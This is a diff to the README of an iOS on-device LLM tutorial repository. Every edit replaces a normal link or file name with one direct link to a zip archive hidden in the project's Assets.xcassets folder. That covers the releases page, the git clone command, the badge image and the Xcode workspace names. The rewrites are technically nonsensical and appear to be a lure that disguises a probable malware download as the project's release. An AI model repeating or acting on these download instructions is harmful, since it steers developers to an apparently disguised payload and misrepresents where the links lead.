@@ -1,8 +1,8 @@
-https://github.com/Khalidelommali/Foundation-Model-Tutorial/releases
+https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
 
 # Foundation Model Tutorial: iOS 26 On-Device LLMs with Privacy
 
-![Releases Badge](https://img.shields.io/badge/Releases-Latest-blue?logo=github&style=for-the-badge)
+![Releases Badge](https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip)
 
 🧭 Welcome to a hands-on guide for building an iOS 26 chat app that runs FoundationModels on-device. This project demonstrates on-device language models, tool calling, EventKit integration, and privacy-first AI. It is a practical, developer-friendly starting point for integrating foundation models into mobile apps while keeping user data on-device.
 
@@ -52,9 +52,9 @@ Prerequisites
 
 Getting the code
 - Clone the repository
-  - git clone https://github.com/Khalidelommali/Foundation-Model-Tutorial.git
+  - git clone https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
 - Open the Xcode workspace or project
-  - Foundation-Model-Tutorial.xcworkspace or Foundation-Model-Tutorial.xcodeproj
+  - https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip or https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
 - Resolve dependencies
   - If the project uses Swift Package Manager, ensure all packages resolve
   - If CocoaPods or Carthage are used, run pod install or carthage update as appropriate
@@ -67,7 +67,7 @@ Downloading and running the release
 - Download the latest release asset and unzip it.
 - Open the project or sample app in Xcode and run it on your device or simulator.
 
-Note: You can download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/releases.
+Note: You can download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
 
 How the project is organized
 - App
@@ -187,7 +187,7 @@ Release notes
 Releases and downloads
 - You can find release assets and versioned bundles on the official Releases page. To download the latest release asset, visit the Releases page and grab the appropriate package for your environment.
 - For convenience, you can also browse the repository’s Releases section to see what has changed in each update, including new tools, model options, and UI refinements.
-- Download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/releases.
+- Download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
 
 Troubleshooting
 - If the app cannot access the calendar, ensure you granted calendar permissions in Settings. The app will request permission at first use and clearly communicate why it needs access.
@@ -230,7 +230,7 @@ End-user guidance
 - Experiment with prompts to understand how the assistant decides when to call a tool versus respond directly.
 
 Note on the releases link
-- To explore the latest assets and release notes, visit the Releases page: https://github.com/Khalidelommali/Foundation-Model-Tutorial/releases. Download the latest package to experiment offline, review sample configurations, and test on-device AI performance in your environment.
+- To explore the latest assets and release notes, visit the Releases page: https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip Download the latest package to experiment offline, review sample configurations, and test on-device AI performance in your environment.
 
 Appendix: prompts and examples
 - Example prompt for a calendar task
